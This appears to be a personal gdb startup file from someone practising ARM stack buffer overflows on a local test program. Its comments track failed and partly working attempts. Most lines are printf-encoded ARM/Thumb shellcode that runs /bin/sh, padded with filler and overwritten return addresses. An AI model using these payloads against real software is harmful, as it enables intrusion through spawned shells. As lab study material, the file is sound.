# program args
# You have got to be fscking kidding me.  Arm implementation of
# gdb on this debian vm does not work with set args even though
# the command is available.  Someone else had a similar error
# http://stackoverflow.com/questions/31031403/pass-arguments-to-arm-program-while-remotely-debugging
# Ok its even worse.  If you run gdb with args on the gdb command invokation 
# they are not used.  you must set args prior to issuing run
# command. OMFG
# I'm leaving it in there for when I dork with the file on x64
#
# Okay I stand corrected.  It worked the last time.
# 
# And now I figured out why.  if you run normally it works, 
# but if you do a rerun like so run > outfile.txt
# It overwrites the args. Consquently I have added the
# redirect of stdout below.
#

# setups for specific programs
#
# args for bof.c
#break main

# Demo using the hello asm to see arm assembly
# hello.o
# The second byte will term the string. Nothing else to do.
#set args `printf "\x01\x00\xa0\xe3\x14\x10\x9f\xe5\x0c\x20\xa0\xe3\x04\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\x00\x00\x48\x65\x6c\x6c\x6f\x2c\x20\x41\x52\x4d\x21\x0AAAABBBBCCCCDDDD"`

# This is from phrack.asm
# Its the code from the alphanumeric filter text.
# Try as I might, I could not get this to work.  Perhaps I did 
# not use the correct assembler flags, but I get the same opcodes
# as the author and the part where it places the registers on the
# stack fails.  I tried to adjust the stack so that the registers
# pop the stack such that the sp is similar but it stil failed.

# set args `printf "\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x38\x30\x41\x52\x30\x30\x4f\x42\x30\x30\x4f\x52\x30\x30\x53\x55\x30\x30\x53\x45\x39\x50\x53\x42\x39\x50\x53\x52\x30\x70\x4d\x42\x38\x30\x53\x42\x63\x41\x43\x50\x64\x61\x44\x50\x71\x41\x47\x59\x79\x50\x44\x52\x65\x61\x4f\x50\x65\x61\x46\x50\x65\x61\x46\x50\x65\x61\x46\x50\x65\x61\x46\x50\x65\x61\x46\x50\x65\x61\x46\x50\x64\x30\x46\x55\x38\x30\x33\x52\x39\x70\x43\x52\x50\x50\x37\x52\x30\x50\x35\x42\x63\x50\x46\x45\x36\x50\x43\x42\x65\x50\x46\x45\x42\x50\x33\x42\x6c\x50\x35\x52\x59\x50\x46\x55\x56\x50\x33\x52\x41\x50\x35\x52\x57\x50\x46\x55\x58\x70\x46\x55\x78\x30\x47\x52\x63\x61\x46\x50\x61\x50\x37\x52\x41\x50\x35\x42\x49\x50\x46\x45\x38\x70\x34\x42\x30\x50\x4d\x52\x47\x41\x35\x58\x39\x70\x57\x52\x41\x41\x41\x4f\x38\x50\x34\x42\x67\x61\x4f\x50\x30\x30\x30\x51\x78\x46\x64\x30\x69\x38\x51\x43\x61\x31\x32\x39\x41\x54\x51\x43\x36\x31\x42\x54\x51\x43\x30\x31\x31\x39\x4f\x42\x51\x43\x41\x31\x36\x39\x4f\x43\x51\x43\x61\x30\x32\x38\x30\x30\x32\x37\x31\x65\x78\x65\x63\x6d\x65\x32\x32\x37\x32\x37AAAABB\x24\x44\x04\x7e\x22\xf4\xff\x7e\x24\xf4\xff\x7eEEFFFF"`

# for salman shell code
# Of course it does not work out of box and some assembly is required.
#file salwan
#break _start

# for bof using salwan shell code
break main
# this is just a buffer and the buffer in shell code fits exactly
# using buffer size of 36
# set args `printf "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41"`

# this works as far as jumping to the code, but it appears to remain in arm mode
# this one for unmodified sal shell code
#set args `printf "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41AAAA\xac\xf6\xff\x7eDDDDEEEEFFFF"`


# this works as far as jumping to the code, but it appears to remain in arm mode
# this one for unmodified sal shell code
set args `printf "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41BBBB\xac\xf6\xff\x7eDDDDEEEEFFFF"`




# try to set a thumb address, when we load r7 it uses odd with AAAA but it gets totally wacked.
#set args `printf "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41AAAA\xad\xf6\xff\x7eDDDDEEEEFFFF"`

# try to set a thumb address, when we load r7 it uses even with BBBB but it gets totally wacked.
#set args `printf "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41BBBB\xad\xf6\xff\x7eDDDDEEEEFFFF"`


# try to omit the switching modes, r7 lsb is BB, so odd
#set args `printf "\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41AAAA\x12\x34\x56\x78\xBB\xbc\xcd\xef\xad\xf6\xff\x7eDDDDEEEEFFFF"`

# try to omit the switching modes, r7 lsb is AA, so even
#set args `printf "\x01\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41AAAA\x12\x34\x56\xBB\xbc\xcd\xef\xaf\xf6\xff\x7eDDDDEEEEFFFF"`

# same thing but use BBBB for r7, this one will definitely switch us to arm mode
#set args `printf "\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41BBBB\x12\x34\x56\x78\x9a\xbc\xcd\xef\xde\xf6\xff\x7eDDDDEEEEFFFF"`



# remove initial thumbmode instructions
# with 28 byte bufffer, its at 0x7efff6b4
#set args `printf "\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41"`
#set args `printf "\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41BBBB\xb5\xf6\xff\x7eDDDDEEEEFFFF"`


# trying to work on thumb mode
#set args `printf "\xAA\xAA\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41BB\xae\xf6\xff\x7eDDDDEEEEFFFF"`

# trying to work on thumb mode. this one has the switch modes to arm b4 swi
#set args `printf "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x0e\x30\x01\x90\x01\xa9\x92\x1a\x0c\x27\x7b\x46\x18\x47\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41"`


# trying to work on thumb mode
# ret addr is 0x7efff6a8
#set args `printf "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x78\x46\x12\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x7b\x46\x18\x47\x01\xdf\x12\x34\x56\x78\x2f\x62\x69\x6e\x2f\x73\x68\x41AAAA\xa8\xf6\xff\x7e"`



#source .gdbenv
set history save
set history size  1000000000
#layout next
#layout next
#focus cmd
